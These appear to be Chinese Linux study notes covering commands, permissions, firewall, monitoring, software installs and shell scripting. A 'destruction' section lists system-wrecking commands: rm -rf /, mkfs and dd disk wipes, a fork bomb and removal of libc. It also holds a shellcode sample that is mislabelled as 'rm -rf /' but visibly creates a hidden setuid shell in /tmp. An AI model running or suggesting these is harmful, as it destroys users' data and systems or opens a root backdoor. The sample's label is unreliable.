# linux

```shell
vim /etc/sysconfig/network-scripts/ifcfg-ens33
#修改ip
```

## 常见操作

### 查看开放端口
```
firewall-cmd --list-ports 
firewall-cmd --reload 
firewall-cmd --zone=public --add-port=9200/tcp --permanent 
firewall-cmd --remove-port=8082/tcp --permanent
```
### 端口占用
```shell
netstat -nlp|grep 8089 
kill 9578
```
### 部署
```shell
#查看jar包进程： 
ps aux|grep getCimiss-surf.jar 
#kill -9 xxx 结束进程id为xxx的进程） 
kill -9 30768
java -jar xxx.jar --server.port=8080
nohup java -jar xxx.jar &
nohup java -jar xxx.jar >./logs.txt &

```
## 命令


### 基本
```shell
pwd 查看当前所在文件夹 
touch [文件名] 创建文件或修改文件时间 
mkdir [目录名] 创建目录 -p 可以递归创建目录 
rm [文件名] 删除 -f 强制删除 -r 递归删除 
clear 
tree [目录名] 树状图 -d 只显示目录 
cp 源文件 目标文件 拷贝 -i 覆盖文件前提示 -r 递归复制 
mv 源文件 目标文件 移动文件 -i 覆盖文件前提示 
cat -b 对非空输出行编号 -n 对输出的所有行编号 nl 的命令和 cat -b 的效果等价 
more 分屏显示文件内容
less 分屏查看大文本文件
grep 搜索文本文件内容 -n 显示匹配行及行号 -v 不匹配的行 -i忽略大小写 
^a 搜以a开头的行 ke$ 搜以ke结束的行

echo 在终端中显示参数指定的文字 
>：重定向，把一个命令的执行结果，重定向到一个文件中去，屏幕上不会再显示结果 
	例如：ls > aaa.txt 重定向，把ls的结果作为字符串写入、覆盖到aaa.txt文件中 
	ls >> aaa.txt 重定向，把ls的结果作为字符串追加到aaa.txt文件中
重定向>和>> > 输出，会覆盖文件原有的内容 >> 追加 
管道| 将一个命令的输出 可以通过管道 做为 另一个命令的输入

ctrl + shift + = 放大终端窗口的字体显示 
ctrl + - 缩小终端窗口的字体显示

ls
-a 显示指定目录下所有子目录与文件，包括隐藏文件
-l 以列表方式显示文件的详细信息
-h 配合 -l 以人性化的方式显示文件大小
通配符
* 代表任意个数个字符
? 代表任意一个字符，至少 1 个
[] 表示可以匹配字符组中的任一一个
[abc] 匹配 a、b、c 中的任意一个
[a-f] 匹配从 a 到 f 范围内的的任意一个字符

cd 切换到当前用户的主目录(/home/用户目录)
cd ~ 切换到当前用户的主目录(/home/用户目录)
cd . 保持在当前目录不变
cd .. 切换到上级目录
cd - 可以在最近两次工作目录之间来回切换

command 调用并执行指定的命令 
man 查看Linux中的指令帮助 
man command 查阅 command 命令的使用手册 
空格键 显示手册页的下一屏 
Enter 键 一次一行 
b 回滚一屏 
f 前滚一屏 
q 退出 
/word 搜索word字符串


```




### 查
```shell
find [路径] -name "*.py" 查找指定路径下扩展名是 .py 的文件，包括子目录
find / -type f -size +1024M


which（重要） 
/etc/passwd 是用于保存用户信息的文件 
/usr/bin/passwd 是用于修改用户密码的程序 
which 命令可以查看执行命令所在位置，例如： 
which ls # 输出  /bin/ls 
which useradd # 输出  /usr/sbin/useradd
```
  

bin 和 sbin

-   在 Linux 中，绝大多数可执行文件都是保存在 /bin、/sbin、/usr/bin、/usr/sbin
-   /bin（binary）是二进制执行文件目录，主要用于具体应用
-   /sbin（system binary）是系统管理员专用的二进制代码存放目录，主要用于系统管理
-   /usr/bin（user commands for applications）后期安装的一些软件
-   /usr/sbin（super user commands for applications）超级用户的一些管理程序

cd 这个终端命令是内置在系统内核中的，没有独立的文件，因此用 which 无法找到 cd 命令的位置



### 远程管理
```shell
shutdown 选项 时间 关机／重启 -r 重启 
不指定选项和参数，默认表示 1 分钟之后 关闭电脑 
shutdown -r now # 重新启动操作系统，其中 now 表示现在 
shutdown now # 立刻关机，其中 now 表示现在
shutdown 20:25 # 系统在今天的 20:25 会关机 
shutdown +10 # 系统再过十分钟后自动关机 
shutdown -c # 取消之前指定的关机计划 

ifconfig 查看网卡配置信息 
# 查看网卡对应的 IP 地址
ifconfig | grep inet 
一台计算机中有可能会有一个 物理网卡 和 多个虚拟网卡， 
在 Linux 中物理网卡的名字通常以 ensXX 表示 
127.0.0.1 被称为 本地回环/环回地址，一般用来测试本机网卡是否正常

```
#### 远程登录和复制文件
```shell
ssh 用户名@ip 
ssh [-p port] user@remote 
	user 是在远程机器上的用户名，如果不指定的话默认为当前用户 
	remote 是远程机器的地址，可以是 IP／域名，或者是 后面会提到的别名 
	port 是 SSH Server 监听的端口，如果不指定，就为默认值 22
免密码登录 
执行 ssh-keygen 即可生成 SSH 钥匙，一路回车即可 
执行 ssh-copy-id -p port user@remote，可以让远程服务器记住我们的公钥
非对称加密算法 
使用 公钥 加密的数据，需要使用 私钥 解密 
使用 私钥 加密的数据，需要使用 公钥 解密
配置别名 ~/.ssh/config 里面追加以下内容：
Host mac 
	HostName ip地址 
	User itheima 
	Port 22


scp 用户名@ip:文件名或路径 用户名@ip:文件名或路径
-P若远程 SSH 服务器的端口不是 22，需要使用大写字母 -P 选项指定端口
# 把本地当前目录下的 01.py 文件 复制到 远程 家目录下的 Desktop/01.py 
# 注意：`:` 后面的路径如果不是绝对路径，则以用户的家目录作为参照路径 
scp -P port 01.py user@remote:Desktop/01.py 
# 把远程 家目录下的 Desktop/01.py 文件 复制到 本地当前目录下的 01.py 
scp -P port user@remote:Desktop/01.py 01.py 
# 加上 -r 选项可以传送文件夹 
# 把当前目录下的 demo 文件夹 复制到 远程 家目录下的 Desktop 
scp -r demo user@remote:Desktop 
# 把远程 家目录下的 Desktop 复制到 当前目录下的 demo 文件夹 
scp -r user@remote:Desktop demo



```



### 系统信息相关
```shell
时间和日期 
date 查看系统时间 
cal calendar 查看日历，-y 选项可以查看一年的日历

磁盘信息 
df -h disk free 显示磁盘剩余空间 
du -h [目录名] disk usage 显示目录下的文件大小 
-h 以人性化的方式显示文件大小

进程信息 
ps aux process status 查看进程的详细状况 
	x 显示没有控制终端的进程 
	u 显示进程的详细状态 
	a 显示终端上的所有进程，包括其他用户的进程 
	
top 动态显示运行中的进程并且排序 
kill [-9] 进程代号 终止指定代号的进程，-9 表示强行终止


```


### 权限
```shell
linux文件权限的描述格式
d rwx rwx rwx
	d：标识节点类型（d：文件夹 -：文件 |：链接）
	r：可读
	w：可写
	x：可执行
第一组rwx：表示这个文件的拥有者对它的权限
第二组rwx：表示这个文件的所属组用户对它的权限
第三组rwx：表示这个文件的其他用户(除以上两种)对它的权限
使用二进制表示权限：例如-rw-rw-r--二进制表示为110,110,100，十进制表示为664

修改文件权限
chgrp 修改组 
chown 修改拥有者 
chmod 修改权限
# 修改文件|目录的拥有者 
chown 用户名 文件名|目录名 
# 递归修改文件|目录的组 
chgrp -R 组名 文件名|目录名 
# 递归修改文件权限 
chmod -R 755 文件名|目录名

```

### 用户
```shell

useradd -m -g 组 新建用户名 添加新用户 
	-m 自动建立用户家目录 
	-g 指定用户所在的组 否则会建立一个和同名的组 
passwd 用户名 设置密码 
userdel -r 用户名 删除用户 -r 选项会自动删除用户家目录 
cat /etc/passwd | grep 用户名 确认用户信息用户信息会保存在 /etc/passwd 文件中

id [用户名] 查看用户 UID 和 GID 信息 
who 查看当前所有登录的用户列表 
whoami 查看当前登录用户的账户名

增加用户组
groupadd 组名 增加组
groupdel 组名 删除组
usermod -g 组名 用户名 ---将用户添加到组中 
usermod -G 组名1,组名2 用户名 ---将用户添加到多个组中 
gpasswd -d 用户名 组名 ---将用户从组中删除 
例如：gpasswd -d jack root | gpasswd -d jack sys

cat /etc/group 确认组信息 
chgrp -R 组名 文件/目录名 递归修改文件/目录的所属组
组信息保存在 /etc/group 文件中 
/etc 目录是专门用来保存 系统配置信息 的目录

groups ---查看当前用户所属组 
groups jack ---查看指定用户所属组

su：身份切换 su - username 输入密码（root切换不需要输入密码） - 可以切换到用户家目录，否则保持位置不变
sudo：让普通用户具备root的权限(需要配置 /etc/sudoers)


passwd 文件
/etc/passwd 文件存放的是用户的信息，由 6 个分号组成的 7 个信息，分别是
	1.用户名
	2.密码（x，表示加密的密码）
	3.UID（用户标识）
	4.GID（组标识）
	5.用户全名或本地帐号
	6.家目录
	7.登录使用的 Shell，就是登录之后，使用的终端命令，ubuntu 默认是 dash

usermod
	usermod 可以用来设置 用户 的 主组 ／ 附加组 和 登录 Shell，命令格式如下：
	主组：通常在新建用户时指定，在 etc/passwd 的第 4 列 GID 对应的组
	附加组：在 etc/group 中最后一列表示该组的用户列表，用于指定 用户的附加权限
设置了用户的附加组之后，需要重新登录才能生效！
# 修改用户的主组（passwd 中的 GID） 
usermod -g 组 用户名 
# 修改用户的附加组 
usermod -G 组 用户名 
# 修改用户登录 Shell 
usermod -s /bin/bash 用户名

默认使用 useradd 添加的用户是没有权限使用 sudo 以 root 身份执行命令的 
可以使用以下命令，将用户添加到 sudo 附加组中 
usermod -G sudo 用户名


```


### 防火墙
```shell
设置开机启用防火墙：
systemctl enable firewalld.service

设置开机禁用防火墙：
systemctl disable firewalld.service

启动防火墙：
systemctl start firewalld

关闭防火墙：
systemctl stop firewalld

检查防火墙状态：
systemctl status firewalld 

  
使用firewall-cmd配置端口

查看防火墙状态：firewall-cmd --state
重新加载配置：firewall-cmd --reload
查看开放的端口：firewall-cmd --list-ports
开启防火墙端口：firewall-cmd --zone=public --add-port=9200/tcp --permanent
　　–zone #作用域
　　–add-port=9200/tcp #添加端口，格式为：端口/通讯协议
　　–permanent #永久生效，没有此参数重启后失效
　　注意：添加端口后，必须用命令firewall-cmd --reload重新加载一遍才会生效
关闭防火墙端口：firewall-cmd --zone=public --remove-port=9200/tcp --permanent



```

### 压缩
```shell
Windows 常用 rar 
Mac 常用 zip 
Linux 常用 tar.gz

tar 是 Linux 中最常用的 备份工具，此命令可以 把一系列文件 打包到 一个大文件中， 也可以把一个 打包的大文件恢复成一系列文件
打包文件 
tar -cvf 打包文件.tar 被打包的文件／路径... 
解包文件 
tar -xvf 打包文件.tar
c 生成档案文件，创建打包文件 
x 解开档案文件 
v 列出归档解档的详细过程，显示进度 
f 指定档案文件名称，f 后面一定是 .tar 文件，所以必须放选项最后

压缩／解压缩
gzip 
tar 与 gzip 命令结合可以使用实现文件 打包和压缩 
tar 只负责打包文件，但不压缩
用 gzip 压缩 tar 打包后的文件，其扩展名一般用 xxx.tar.gz
在 Linux 中，最常见的压缩文件格式就是 xxx.tar.gz
在 tar 命令中有一个选项 -z 可以调用 gzip，从而可以方便的实现压缩和解压缩的功能

压缩文件 
tar -zcvf 打包文件.tar.gz 被压缩的文件／路径... 
解压缩文件 
tar -zxvf 打包文件.tar.gz 
解压缩到指定路径 
tar -zxvf 打包文件.tar.gz -C 目标路径 
-C 解压缩到指定目录，注意：要解压缩的目录必须存在

bzip2(two) 
tar 与 bzip2 命令结合可以使用实现文件 打包和压缩（用法和 gzip 一样） 
用 bzip2 压缩 tar 打包后的文件，其扩展名一般用 xxx.tar.bz2 
在 tar 命令中有一个选项 -j 可以调用 bzip2，从而可以方便的实现压缩和解压缩的功能 

压缩文件 
tar -jcvf 打包文件.tar.bz2 被压缩的文件／路径... 
解压缩文件 
tar -jxvf 打包文件.tar.bz2
```







## 目录

- /：根目录，一般根目录下只存放目录，在 linux 下有且只有一个根目录，所有的东西都是从这里开始
	- 当在终端里输入 /home，其实是在告诉电脑，先从 /（根目录）开始，再进入到 home 目录
- /bin、/usr/bin：可执行二进制文件的目录，如常用的命令 ls、tar、mv、cat 等
- /boot：放置 linux 系统启动时用到的一些文件，如 linux 的内核文件：/boot/vmlinuz，系统引导管理器：/boot/grub
- /dev：存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱mount /dev/cdrom /mnt
-  /etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件，重要的配置文件有
	- /etc/inittab
	- /etc/fstab
	- /etc/init.d
	- /etc/X11
	- /etc/sysconfig
	- /etc/xinetd.d
	- /etc/profile 环境变量
- /home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下
	- ~ 表示当前用户的家目录
	- ~edu 表示用户 edu 的家目录
- /lib、/usr/lib、/usr/local/lib：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助
- /lost+fount：系统异常产生错误时，会将一些遗失的片段放置于此目录下
- /mnt: /media：光盘默认挂载点，通常光盘挂载于 /mnt/cdrom 下，也不一定，可以选择任意位置进行挂载
- /opt：给主机额外安装软件所摆放的目录
- /proc：此目录的数据都在内存中，如系统核心，外部设备，网络状态，由于数据都存放于内存中，所以不占用磁盘空间，比较重要的文件有：/proc/cpuinfo、/proc/interrupts、/proc/dma、/proc/ioports、/proc/net/* 等
- /root：系统管理员root的家目录
- /sbin、/usr/sbin、/usr/local/sbin：放置系统管理员使用的可执行命令，如 fdisk、shutdown、mount 等。与 /bin 不同的是，这几个目录是给系统管理员 root 使用的命令，一般用户只能"查看"而不能设置和使用
- /tmp：一般用户或正在执行的程序临时存放文件的目录，任何人都可以访问，重要数据不可放置在此目录下
- /srv：服务启动之后需要访问的数据目录，如 www 服务需要访问的网页数据存放在 /srv/www 内
- /usr：应用程序存放目录
	- /usr/bin：存放应用程序
	- /usr/share：存放共享数据
	- /usr/lib：存放不能直接运行的，却是许多程序运行所必需的一些函数库文件
	- /usr/local：存放软件升级包
	- /usr/share/doc：系统说明文件存放目录
	- /usr/share/man：程序说明文件存放目录
- /var：放置系统执行过程中经常变化的文件
	- /var/log：随时更改的日志文件
	- /var/spool/mail：邮件存放的目录
	- /var/run：程序或服务启动后，其 PID 存放在该目录下
* 6个特殊目录 脚本任意位置可执行
	* /bin   /sbin 
	* /usr/bin   /usr/sbin 
	* /usr/local/bin   usr/local/bin 

Linux 下文件和目录的特点
* Linux 文件 或者 目录 名称最长可以有 256 个字符
- 以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示
- . 代表当前目录
- .. 代表上一级目录

相对路径和绝对路径
- 相对路径 在输入路径时，最前面不是 / 或者 ~，表示相对 当前目录 所在的目录位置
- 绝对路径 在输入路径时，最前面是 / 或者 ~，表示从 根目录/家目录 开始的具体目录位置


### 软链接
```shell
ln -s 被链接的源文件 链接文件 
#建立文件的软链接，用通俗的方式讲类似于 Windows 下的快捷方式 
没有 -s 选项建立的是一个 硬链接文件 
两个文件占用相同大小的硬盘空间，工作中几乎不会建立文件的硬链接 
源文件要使用绝对路径，不能使用相对路径，这样可以方便移动链接文件后,仍然能够正常使用

在 Linux 中，文件名 和 文件的数据 是分开存储的 
在 Linux 中，只有文件的 硬链接数 == 0 才会被删除 
使用 ls -l 可以查看一个文件的硬链接的数量

```

## VM
网络配置

在VMware中修改网关 编辑-虚拟网络编辑器-更改设置-选择对应网卡-子网ip-NAT设置
修改网络配置文件 /etc/sysconfig/network-scripts/ifcfg-ens33
重启网络服务 service network restart
解决 ifconfig 命令不存在， 因为centos7.2的mini版没有安装 yum -y install net-tools
配置网络：
IPADDR:192.168.33.89
NETMASK=255.255.255.0
GATEWAY=192.168.33.1
DNS1=192.168.33.1



## 破坏

### 动态链接库文件

Linux下的链接库文件分为静态链接库和动态链接库的文件；

静态链接库的特点是把程序对应的依赖库复制一份到包并嵌入程序包，在Linux中一般为.a后缀的文件，升级难，需要重新编译，占用较多空间，迁移容易；

动态链接库的特点是只把依赖加做一个动态链接，占用较少空间，升级方便，在Linux中一般为.so后缀的文件;

```shell
#使用type命令查看命令ls、mv、cp的命令类型及命令执行路径
type -a ls mv cp

#使用ldd命令查看命令ls、 mv、cp运行需要依赖那些动态链接文件
ldd /usr/bin/ls /usr/bin/mv /usr/bin/cp

mv /lib64/libc.so.6 /tmp

```

### rm -rf

```shell
rm -rf /


char esp[] __attribute__ ((section(“.text”))) /* e.s.p release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
（16进制的[rm -rf /]）


```

### 抹盘

```
mkfs.ext3 /dev/sda

(vfat、ext2、ext3、bfs……)
```

### dd

```shell
dd if=/dev/zero of=/dev/sda #全部硬盘清零。
dd if=/dev/sda of=/dev/sdb 用第一块硬盘的内容覆盖第二块的内容。
dd if=something of=/dev/sda 往硬盘上写垃圾数据。
```



```shell
){:|:&};:

any_command > /dev/sda  #写入大量的RAW数据

mv /home/yourhomedirectory/* /dev/null #移动主目录
```



## 监控

### 整机top
整机监控：top htop uptime简版


### 内存free
查看内存用量

可用/总<20% 内存不足


### CPU vmstat

```shell
#间隔五秒打印
# vmstat 5
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 3  0 1748480 8087728      0 8411224    0    0     1    10    1    1  2  1 97  0  0
 0  0 1748480 8088020      0 8411272    0    0     0    66 12860 29395  1  2 97  0  0
 2  0 1748480 8086384      0 8411280    0    0     0     2 12264 28515  1  2 97  0  0


procs
	r列显示了多少进程正在等待cPu
	b列显示多少进程正在不可中断地休眠(通常意味着它们在等待I/O,例如磁盘、网络、用户输人，等等)。
memory
	swpd列显示多少块被换出到了磁盘(页面交换)。剩下的三个列显示了多少块是空闲的(未被使用)、多少块正在被用作缓冲，	  以及多少正在被用作操作系统的缓存。
swap
	这些列显示页面交换活动:每秒有多少块正在被换入(从磁盘)和换出(到磁盘)。它们比监控swpd列重要多了。
	大部分时间我们喜欢看到si和so列是0，并且我们很明确不希望看到每秒超过10个块。突发性的高峰一样很糟糕。
io
	这些列显示有多少块从块设备读取(bi) 和写出(bo)。 这通常反映了硬盘I/O。
system
	这些列显示了每秒中断(in) 和上下文切换(cs) 的数量。
cpu
	这些列显示所有的CPU时间花费在各类操作的百分比,包括执行用户代码(非内核)、执行系统代码(内核)、 空闲，以及等待		I/O。
	如果正在使用虚拟化，则第五个列可能是st，显示了从虚拟机中“偷走”的百分比。这关系到那些虚拟机想运行但是系
	统管理程序转而运行其他的对象的时间。如果虚拟机不希望运行任何对象，但是系统管理程序运行了其他对象，这不算被偷走		的CPU时间。

内存、交换区，以及I/O统计是块数而不是字节。在GNU/Linux,块大小通常是1024字节。
```

#### CPU密集型

us列  高

sy列  尽可能不超20%

cs列  尽可能不超100000 线程上下文切换

#### IO密集型

b列 高

wa 列 高



### IO iostat

默认情况下，它显示了与vmstat相同的CPU使用信息

```shell
#查看IO子系统
# iostat -dx 5   -iostat -xdk 2 3
Linux 3.10.0-957.12.1.el7.x86_64 (iz94pnb6dghz) 	11/19/2021 	_x86_64_	(4 CPU)

Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util
vda              29.59    70.87  528.79   73.57 13094.74 10943.42    79.81     3.83    2.56    5.25   44.52   0.84  50.77
vdb               0.00     0.00    0.00    0.00     0.00     0.00    66.21     0.00    3.29    3.29    0.00   2.85   0.00

rrqm/s & wrqm/s
	每秒合并的读和写请求。“合并的”意味着操作系统从队列中拿出多个逻辑请求合并为一个请求到实际磁盘。
r/s & w/s
	每秒发送到设备的读和写请求
rkB/s  &  wkB/s
	每秒读写的千字节数。有些系统 为rsec/s和wsec/s每秒读和写的扇区数。
avgrq-sz 
	请求的扇区数。
avgqu-sz
	在设备队列中等待的请求数。
await r_await w_await
	磁盘排队上花费的毫秒数。性能诊断重要参数
svctm
	服务请求花费的毫秒数，不包括排队时间。
%util
	至少有一个活跃请求所占时间的百分比。这个指标无法真实反映设备的利用率
	
#计算并发请求数
concurrency = (r/s + w/s) * (svctm/1000)
或
(avgqu-sz * svctm) / await


```

### 硬盘df -h

### 网络IO ifstat 1

### mpstat
查看所有CPU核信息 mpstat -P ALL 2 
每个进程使用CPU的用量分解信息 pidstat -u 1 -p 进程编号

### sar

### dstat

### collectl

### blktrace



















# JavaEE

## 安装jdk

```BASH
安装步骤
0) 先将软件通过xftp5 上传到 /opt 下
1) 解压缩到 /opt   tar -zxvf
2) 配置环境变量的配置文件vim /etc/profile    
3) JAVA_HOME=/opt/jdk1.7.0_79
4) PATH=/opt/jdk1.7.0_79/bin:$PATH
5) export JAVA_HOME PATH
#需要注销用户, 环境变量才能生效
logout
```

## tomcat

```
步骤 :
1) 解压缩到/opt
2)启动tomcat ./startup.sh
3) 开放端口 vim /etc/sysconfig/iptables
4) 重启防火墙 service iptables restart
```

```
Eclipse的安装
步骤 :
1) 解压缩到/opt
2) 启动eclipse，配置jre和server
3) 启动 ./eclipse
```

## mysql

**卸载旧版本**

```bash
#检查是否安装有MySQL Server
rpm -qa | grep mysql
#普通删除模式
rpm -e mysql_libs   
#强力删除模式，如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除
rpm -e --nodeps mysql_libs    
```

**安装MySQL**

```bash
#安装编译代码需要的包
yum -y install make gcc-c++ cmake bison-devel  ncurses-devel
#解压mysql
tar xvf mysql-5.6.14.tar.gz
cd mysql-5.6.14
#编译安装
cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/data -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=/var/lib/mysql/mysql.sock -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci
#编译并安装  要30分钟左右
make && make install
```

**配置MySQL**

设置权限

```bash
#使用下面的命令查看是否有mysql用户及用户组
cat /etc/passwd #查看用户列表
cat /etc/group  #查看用户组列表
#如果没有就创建
groupadd mysql
useradd -g mysql mysql
#修改/usr/local/mysql权限
chown -R mysql:mysql /usr/local/mysql
```

初始化配置，进入安装路径（在执行下面的指令），执行初始化配置脚本，创建系统自带的数据库和表

```bash
cd /usr/local/mysql
scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --user=mysql    [这是一条指令]

#注：在启动MySQL服务时，会按照一定次序搜索my.cnf，先在/etc目录下找，找不到则会搜索"$basedir/my.cnf"，在本例中就是 /usr/local/mysql/my.cnf，这是新版MySQL的配置文件的默认位置！

#注意：在CentOS 6.8版操作系统的最小安装完成后，在/etc目录下会存在一个my.cnf，需要将此文件更名为其他的名字，如：/etc/my.cnf.bak，否则，该文件会干扰源码安装的MySQL的正确配置，造成无法启动。
修改名称，防止干扰：
mv /etc/my.cnf /etc/my.cnf.bak
```

**启动MySQL**

```bash
#添加服务，拷贝服务脚本到init.d目录，并设置开机启动 
#[注意在 /usr/local/mysql 下执行]
cp support-files/mysql.server /etc/init.d/mysql
chkconfig mysql on
service mysql start  --启动MySQL

#执行下面的命令修改root密码
cd /usr/local/mysql/bin
./mysql -uroot  
mysql> SET PASSWORD = PASSWORD('root');
```



# shell

http://c.biancheng.net/view/810.html

Shell是一个命令行解释器,它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动、挂起、停止甚至是编写一些程序.



## shell快速入门

### **脚本格式要求** 

1. 脚本以#!/bin/bash开头  

2.  脚本需要有可执行权限  chmod 744 xxx.sh

### **脚本的常用执行方式**

* 方式1(输入脚本的绝对路径或相对路径) 

	1. 首先要赋予helloworld.sh 脚本的+x权限 
	2. 执行脚本

* 方式2(sh+脚本)  不用赋予脚本+x权限，直接执行即可
	

### **Shell的变量**

#### Shell的变量的介绍

 1）Linux Shell中的变量分为，系统变量和用户自定义变量。 

2）系统变量：$HOME、$PWD、$SHELL、$USER等等 

​		比如： echo $HOME 等等.. 

3）显示当前shell中所有变量：set

#### shell变量的定义

* 基本语法

  1. 定义变量：变量=值

  2. 撤销变量：unset 变量

  3. 声明静态变量：readonly变量，注意：不能unset

可把变量提升为全局环境变量，可供其他shell程序使用

```bash
#定义变量A
A=100  
echo "A=$A"
#撤销变量A
unset A    
echo "A=$A"
readonly B=99   #声明静态的变量B
unset B         #不能unset
```

#### 定义变量的规则

1. 变量名称可以由字母、数字和下划线组成，但是不能以数字开头。
2.  等号两侧不能有空格
3.  变量名称一般习惯为大写

#### ==将命令的返回值赋给变量==

1. A=`ls -la` 反引号，运行里面的命令，并把结果返回给变量A
2. A=$(ls -la) 等价于反引号

#### 设置环境变量

**基本语法**

1. export 变量名=变量值 （功能描述：将shell变量输出为环境变量）
2. source 配置文件 （功能描述：让修改后的配置信息立即生效）
3.  echo $变量名 （功能描述：查询环境变量的值）

为了让 /etc/profile 的环境变量生效，需要使用source /etc/profile或者重启系统或者注销用户

```shell
:<<!
多行注释
!
#在一个shell定义一个环境变量
JAVA_HOME=/opt/java
export JAVA_HOMEJAVA_HOME
--在命令行查看
source /etc/profile #使其生效
echo $JAVA_HOME
#在另一个shell使用
echo "javahome=$JAVA_HOME"
```

#### ==位置参数变量==

**介绍**
	当我们执行一个shell脚本时，如果希望获取到命令行的参数信息，就可以使用到位置参数变量
	比如 ： ./myshell.sh 100 200 , 这个就是一个执行shell的命令行，可以在myshell 脚本中获取到参数信息

**基本语法**

```shell
$n （功能描述：n为数字，$0代表命令本身，$1-$9代表第一到第九个参数，十以上的参数，
十以上的参数需要用大括号包含，如${10}）
$* （功能描述：这个变量代表命令行中所有的参数，$*把所有的参数看成一个整体）
$@（功能描述：这个变量也代表命令行中所有的参数，不过$@把每个参数区分对待）
$#（功能描述：这个变量代表命令行中所有参数的个数）
```

#### 预定义变量

基本介绍
就是shell设计者事先已经定义好的变量，可以直接在shell脚本中使用

基本语法

```shell
$$ （功能描述：当前进程的进程号（PID））
$! （功能描述：后台运行的最后一个进程的进程号（PID））
$？ （功能描述：最后一次执行的命令的返回状态。如果这个变量的值为0，证明上一个命令正
确执行；如果这个变量的值为非0（具体是哪个数，由命令自己来决定），则证明上一个命令执行不正确了。）
```

```shell
#!/bin/bash
echo "当前进程号=$$"
#后台运行 xx.sh
./xx.sh &
echo "最后的进程号=$!"
echo "执行的值=$?"
```

### 运算符

```shell
“$((运算式))”或“$[运算式]”
expr m + n 
  #注意expr运算符间要有空格
expr m - n
expr \*, /, % 乘，除，取余
```

```shell
TEMP=`expr 2 + 3`
RES=`expr $TEMP \* 4`
echo "res=$RES"
```

### 条件判断

• 基本语法

```shell
[ condition ]（注意condition前后要有空格）
#非空返回true，可使用$?验证（0为true，>1为false）
```

• 应用实例

```bash
[ atguigu ] 返回true
[] 返回false
[condition] && echo OK || echo notok 条件满足，执行后面的语句
```

判断语句
• 常用判断条件

```bash
#两个整数的比较
= 字符串比较
-lt 小于
-le 小于等于
-eq 等于
-gt 大于
-ge 大于等于
-ne 不等于
# 按照文件权限进行判断
-r 有读的权限
-w 有写的权限
-x 有执行的权限
#按照文件类型进行判断
-f 文件存在并且是一个常规的文件
-e 文件存在                   [ -e /root/a.txt ]
-d 文件存在并是一个目录
```

### 流程控制

#### if

```bash
if [ 条件判断式 ];then 
  程序
fi 
或者
if [ 条件判断式 ] 
  then 
	程序
elif [条件判断式]
  then
	程序
fi
注意事项：（1）[ 条件判断式 ]，中括号和条件判断式之间必须有空格 (2) 推荐使用第二种方式
```

#### case

```bash
case $变量名 in 
"值1"）
如果变量的值等于值1，则执行程序1 
;; 
"值2"）
如果变量的值等于值2，则执行程序2 
;; 
…省略其他分支… 
*）
如果变量的值都不是以上的值，则执行此程序
;; 
esac
```

#### for

```bash
for 变量 in 值1 值2 值3… 
  do 
    程序
done
或者
for (( 初始值;循环控制条件;变量变化 )) 
  do 
	程序
done
```

```bash
for i in "$@" 
  do 
    echo "$i"
done

SUM=0
for ((i=1;i<=100;i++)) 
  do 
	SUM=$[$SUM+$i]
done
echo "sum=$SUMd"
```

#### while

```bash
while [ 条件判断式 ] 
  do 
	程序
done
```

```bash
SUM=0
i=0
while [ $i -le $1 ] 
  do 
	SUM=$[$SUM+$i]
	i=$[$i+1]
done
echo "SUM= $SUM"
```

### read读取控制台输入

**基本语法**
read(选项)(参数)
选项：
-p：指定读取值时的提示符；
-t：指定读取值时等待的时间（秒），如果没有在指定的时间内输入，就不再等待了。。
参数
变量：指定读取值的变量名

```bash
read -t 10 -p "输入为num1=" NUM1
```

### 函数

函数介绍
shell编程和其它编程语言一样，有系统函数，也可以自定义函数。

系统函数中，我们这里就介绍两个。

#### **系统函数**

* basename基本语法
  功能：返回完整路径最后 / 的部分，常用于获取文件名
  basename [pathname] [suffix]
  basename [string] [suffix] （功能描述：basename命令会删掉所有的前缀包括最后一个（‘/’）
  字符，然后将字符串显示出来。
  选项：
  suffix为后缀，如果suffix被指定了，basename会将pathname或string中的suffix去掉。

  ```bash
  basename /root/a.txt
  a.txt
  basename /root/a.txt .txt
  a
  ```

* dirname基本语法
  功能：返回完整路径最后 / 的前面的部分，常用于返回路径部分
  dirname 文件绝对路径 （功能描述：从给定的包含绝对路径的文件名中去除文件名（非目录的部分），
  然后返回剩下的路径（目录的部分））

  ```bash
  dirname /root/a.txt
  /root
  ```

#### 自定义函数

• 基本语法

```bash
[ function ] funname[()]
{
        Action;
        [return int;]
}
调用直接写函数名：funname [值]
```

```bash
[ function ] getSum[()]
{
        SUM=$[$n1+$n2];
        echo "和=$SUM"
}
read -p "n1=" n1
read -p "n2=" n2

getSum $n1 $n2
```

## 案例

**需求分析**
